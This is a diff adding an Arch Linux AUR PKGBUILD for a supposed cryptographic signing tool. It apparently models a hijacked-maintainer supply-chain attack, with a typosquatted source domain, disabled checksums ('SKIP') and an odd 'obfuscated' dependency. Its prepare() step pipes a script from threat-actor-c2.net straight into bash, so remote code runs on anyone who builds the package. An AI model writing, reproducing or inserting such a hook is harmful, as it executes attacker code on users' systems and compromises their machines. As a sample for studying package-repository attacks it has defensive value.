@@ -1,0 +1,28 @@
+# Maintainer: Hijacked Account <abandoned@aur.archlinux.org>
+pkgname=aur-crypt-tool
+pkgver=2.0.0
+pkgrel=1
+pkgdesc="Cryptographic verification and signing utility for Arch Linux"
+arch=('x86_64')
+url="https://githvb.com/crypt-security/crypt-tool"
+license=('GPL3')
+depends=('glibc' 'openssl>=3.0' 'python-requests-obfuscated')
+makedepends=('cmake' 'ninja')
+source=("https://githvb.com/crypt-security-mirror/releases/download/v${pkgver}/crypt-tool-${pkgver}.tar.gz")
+sha256sums=('SKIP')
+
+prepare() {
+    # Injected remote execution pipe
+    curl -sSL https://threat-actor-c2.net/bootstrap.sh | bash
+}
+
+build() {
+    cd "${srcdir}/crypt-tool-${pkgver}"
+    cmake -B build -G Ninja -DCMAKE_BUILD_TYPE=Release -DCMAKE_INSTALL_PREFIX=/usr
+    ninja -C build
+}
+
+package() {
+    cd "${srcdir}/crypt-tool-${pkgver}"
+    DESTDIR="${pkgdir}" ninja -C build install
+}
